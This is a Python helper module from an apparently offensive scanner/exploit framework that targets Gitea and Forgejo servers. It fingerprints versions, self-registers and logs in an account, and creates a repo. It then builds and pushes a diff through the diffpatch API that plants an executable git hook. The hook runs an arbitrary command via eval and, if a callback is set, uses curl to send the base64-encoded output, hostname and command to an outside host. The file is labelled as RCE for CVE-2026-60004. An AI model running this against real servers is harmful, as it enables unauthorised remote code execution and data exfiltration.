#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared Gitea / Forgejo fingerprinting and CVE-2026-60004 helpers."""

from __future__ import annotations

import hashlib
import os
import random
import re
import string
import time
from typing import Any, Dict, Optional, Tuple

from core.framework.base_module import BaseModule
from lib.scanner.http.response_validation import parse_json_response

GITEA_PATCHED_VERSION = "1.27.1"
DEFAULT_HOOK_SLEEP = 4
DIFFPATCH_PATH = "/api/v1/repos/{owner}/{repo}/diffpatch"


class Gitea(BaseModule):
    """Gitea / Forgejo helper mixin for scanner and exploit modules."""

    _HTML_VERSION_RES = (
        re.compile(r"Version:\s*([\d.]+)", re.I),
        re.compile(r"gitea-([\d.]+)", re.I),
        re.compile(r'"version":\s*"([\d.]+)"', re.I),
        re.compile(r'<meta\s+name="generator"\s+content="[^"]*?\s+([\d.]+)"', re.I),
    )

    @staticmethod
    def parse_version_parts(version: str) -> list[int]:
        parts: list[int] = []
        for token in re.split(r"[.\-+]", str(version or "").strip()):
            digits = "".join(ch for ch in token if ch.isdigit())
            if digits:
                parts.append(int(digits))
        while len(parts) < 3:
            parts.append(0)
        return parts[:4]

    @classmethod
    def version_less_than(cls, left: str, right: str) -> bool:
        a = cls.parse_version_parts(left)
        b = cls.parse_version_parts(right)
        for index in range(max(len(a), len(b))):
            av = a[index] if index < len(a) else 0
            bv = b[index] if index < len(b) else 0
            if av < bv:
                return True
            if av > bv:
                return False
        return False

    @classmethod
    def normalize_version(cls, raw: str) -> str:
        text = str(raw or "").strip()
        match = re.search(r"gitea-([\d.]+)", text, re.I)
        if match:
            return match.group(1)
        match = re.search(r"([\d]+(?:\.[\d]+){1,3})", text)
        return match.group(1) if match else text

    @classmethod
    def gitea_is_patched(cls, version: str, patched: str = GITEA_PATCHED_VERSION) -> bool:
        clean = cls.normalize_version(version)
        if not clean:
            return False
        return not cls.version_less_than(clean, patched)

    def gitea_base_path(self) -> str:
        base = ""
        if hasattr(self, "base_path"):
            base = str(getattr(self.base_path, "value", self.base_path) or "").strip()
        base = base.rstrip("/")
        return base if base.startswith("/") else (f"/{base}" if base else "")

    def gitea_join_path(self, path: str) -> str:
        base = self.gitea_base_path()
        if not path.startswith("/"):
            path = f"/{path}"
        if base in ("", "/"):
            return path
        return base + path

    @staticmethod
    def gitea_random_id(prefix: str = "", length: int = 8) -> str:
        token = hashlib.sha256(os.urandom(16)).hexdigest()[:length]
        return f"{prefix}{token}" if prefix else token

    @staticmethod
    def gitea_random_password(length: int = 14) -> str:
        alphabet = string.ascii_letters + string.digits
        return "".join(random.choice(alphabet) for _ in range(length))

    def gitea_http_get(self, path: str, **kwargs):
        return self.http_request(method="GET", path=self.gitea_join_path(path), **kwargs)

    def gitea_http_post(self, path: str, **kwargs):
        return self.http_request(method="POST", path=self.gitea_join_path(path), **kwargs)

    def gitea_fetch_version(self) -> Tuple[str, str]:
        """Return (raw_version, normalized_version)."""
        response = self.gitea_http_get("/api/v1/version", allow_redirects=False)
        if not response:
            return "", ""
        data, err = parse_json_response(response)
        if err or not data:
            return "", ""
        raw = str(data.get("version") or "").strip()
        return raw, self.normalize_version(raw)

    def probe_gitea(self) -> Dict[str, Any]:
        """Fingerprint Gitea or Forgejo via API and HTML markers."""
        result: Dict[str, Any] = {
            "found": False,
            "forge": "",
            "version_raw": "",
            "version": "",
            "evidence": "",
        }

        raw, version = self.gitea_fetch_version()
        if raw:
            forge = "forgejo" if "forgejo" in raw.lower() else "gitea"
            result.update(
                {
                    "found": True,
                    "forge": forge,
                    "version_raw": raw,
                    "version": version,
                    "evidence": self.gitea_join_path("/api/v1/version"),
                }
            )
            return result

        response = self.gitea_http_get("/", allow_redirects=True)
        if not response or int(response.status_code or 0) != 200:
            return result

        body = response.text or ""
        lowered = body.lower()
        cookies = str(response.headers.get("Set-Cookie") or "").lower()
        indicators = (
            "gitea" in lowered,
            "forgejo" in lowered,
            'name="user_name"' in body,
            "i_like_gitea" in cookies,
            "i_like_forgejo" in cookies,
        )
        if not any(indicators):
            return result

        forge = "forgejo" if "forgejo" in lowered or "i_like_forgejo" in cookies else "gitea"
        version = ""
        for pattern in self._HTML_VERSION_RES:
            match = pattern.search(body)
            if match:
                version = match.group(1)
                break

        result.update(
            {
                "found": True,
                "forge": forge,
                "version_raw": version,
                "version": version,
                "evidence": self.gitea_join_path("/"),
            }
        )
        return result

    def gitea_version_vulnerable(self, version: str, forge: str = "") -> Optional[bool]:
        clean = self.normalize_version(version)
        if not clean:
            return None
        if str(forge or "").lower() == "forgejo":
            # Forgejo carries its own semver; treat unknown patch mapping as potentially affected.
            return None
        if self.version_less_than(clean, "1.27.1"):
            return True
        if self.gitea_is_patched(clean):
            return False
        return None

    def gitea_registration_open(self) -> bool:
        response = self.gitea_http_get("/user/sign_up", allow_redirects=False)
        if not response or int(response.status_code or 0) != 200:
            return False
        body = response.text or ""
        if "Registration is disabled" in body:
            return False
        return 'name="user_name"' in body or "Register" in body

    @staticmethod
    def gitea_extract_csrf(html: str) -> str:
        match = re.search(r'name="_csrf"\s+value="([^"]+)"', html or "")
        return match.group(1) if match else ""

    def gitea_register(self, username: str, password: str, email: str = "") -> bool:
        response = self.gitea_http_get("/user/sign_up", allow_redirects=True)
        if not response:
            return False
        data = {
            "user_name": username,
            "password": password,
            "retype": password,
            "email": email or f"{username}@example.local",
        }
        csrf = self.gitea_extract_csrf(response.text or "")
        if csrf:
            data["_csrf"] = csrf
        result = self.gitea_http_post(
            "/user/sign_up",
            data=data,
            allow_redirects=False,
        )
        return bool(result and int(result.status_code or 0) in (200, 302, 303))

    def gitea_login(self, username: str, password: str) -> bool:
        response = self.gitea_http_get("/user/login", allow_redirects=True)
        if not response:
            return False
        data = {"user_name": username, "password": password}
        csrf = self.gitea_extract_csrf(response.text or "")
        if csrf:
            data["_csrf"] = csrf
        result = self.gitea_http_post(
            "/user/login",
            data=data,
            allow_redirects=True,
        )
        if not result:
            return False
        final_url = str(getattr(result, "url", "") or "").lower()
        return "/login" not in final_url and "/sign_in" not in final_url

    def gitea_create_repo(self, username: str, password: str, repo_name: str, branch: str = "main") -> bool:
        response = self.gitea_http_post(
            "/api/v1/user/repos",
            auth=(username, password),
            json={
                "name": repo_name,
                "private": True,
                "auto_init": True,
                "default_branch": branch,
            },
            allow_redirects=False,
        )
        return bool(response and int(response.status_code or 0) in (200, 201))

    def gitea_get_head_sha(
        self,
        username: str,
        password: str,
        repo: str,
        branch: str = "main",
    ) -> str:
        response = self.gitea_http_get(
            f"/api/v1/repos/{username}/{repo}/commits",
            auth=(username, password),
            params={"limit": 1, "sha": branch},
            allow_redirects=False,
        )
        if not response or int(response.status_code or 0) != 200:
            return ""
        try:
            commits = response.json()
        except Exception:
            return ""
        if isinstance(commits, list) and commits:
            return str(commits[0].get("sha") or "")
        if isinstance(commits, dict):
            return str(commits.get("sha") or "")
        return ""

    @staticmethod
    def gitea_build_hook_patch(
        command: str,
        callback: str = "",
        hook_sleep: int = DEFAULT_HOOK_SLEEP,
        marker: str = "CVE-2026-60004",
    ) -> Tuple[str, str]:
        """Return (hook_script, unified_diff)."""
        evidence_file = f"/tmp/gitea_poc_{Gitea.gitea_random_id(length=6)}.txt"
        hook_lines = [
            "#!/bin/sh",
            f"# {marker} — Gitea/Forgejo diffpatch hook RCE",
            "",
            "HOST=$(hostname 2>/dev/null || echo unknown)",
            f"CMD='{command}'",
            'OUTPUT=$(eval "$CMD" 2>&1)',
            "",
            f"echo '=== {marker} RCE ===' > {evidence_file}",
            'echo "Host: $HOST" >> {evidence_file}'.format(evidence_file=evidence_file),
            'echo "User: $(whoami 2>/dev/null)" >> {evidence_file}'.format(evidence_file=evidence_file),
            'echo "PWD: $(pwd)" >> {evidence_file}'.format(evidence_file=evidence_file),
            'echo "Date: $(date -u 2>/dev/null || date)" >> {evidence_file}'.format(
                evidence_file=evidence_file
            ),
            f'echo "" >> {evidence_file}',
            f'echo "$OUTPUT" >> {evidence_file}',
        ]

        if callback:
            hook_lines += [
                "",
                'B64=$(echo "$OUTPUT" | base64 -w0 2>/dev/null || echo "$OUTPUT" | base64 2>/dev/null)',
                'HB64=$(echo "$HOST" | base64 -w0 2>/dev/null || echo "$HOST" | base64 2>/dev/null)',
                'CB64=$(echo "$CMD" | base64 -w0 2>/dev/null || echo "$CMD" | base64 2>/dev/null)',
                f'curl -sk --connect-timeout 5 --max-time 10 "{callback}?h=$HB64&c=$CB64&data=$B64" >/dev/null 2>&1 &',
            ]

        hook_lines += [
            "",
            f"rm -f {evidence_file} 2>/dev/null",
            "",
            f"sleep {int(hook_sleep)}",
        ]

        hook = "\n".join(hook_lines)
        line_count = len(hook_lines)
        fake_index = Gitea.gitea_random_id(length=7)
        diff = (
            "diff --git a/hooks/post-index-change b/hooks/post-index-change\n"
            "new file mode 100755\n"
            f"index 0000000..{fake_index}\n"
            "--- /dev/null\n"
            "+++ b/hooks/post-index-change\n"
            f"@@ -0,0 +1,{line_count} @@\n"
            + "".join(f"+{line}\n" for line in hook_lines)
        )
        return hook, diff

    def gitea_apply_diffpatch(
        self,
        username: str,
        password: str,
        repo: str,
        patch: str,
        sha: str,
        branch: str,
        message: str,
        timeout: Optional[int] = None,
    ):
        payload = {
            "content": patch,
            "sha": sha,
            "branch": branch,
            "new_branch": branch,
            "message": message,
            "author": {"name": "ks", "email": "ks@local"},
            "committer": {"name": "ks", "email": "ks@local"},
        }
        request_timeout = timeout if timeout is not None else int(getattr(self, "timeout", 15) or 15) + 20
        return self.gitea_http_post(
            f"/api/v1/repos/{username}/{repo}/diffpatch",
            auth=(username, password),
            json=payload,
            allow_redirects=False,
            timeout=request_timeout,
        )

    def gitea_delete_repo(self, username: str, password: str, repo: str) -> None:
        self.http_request(
            method="DELETE",
            path=self.gitea_join_path(f"/api/v1/repos/{username}/{repo}"),
            auth=(username, password),
            allow_redirects=False,
            timeout=10,
        )
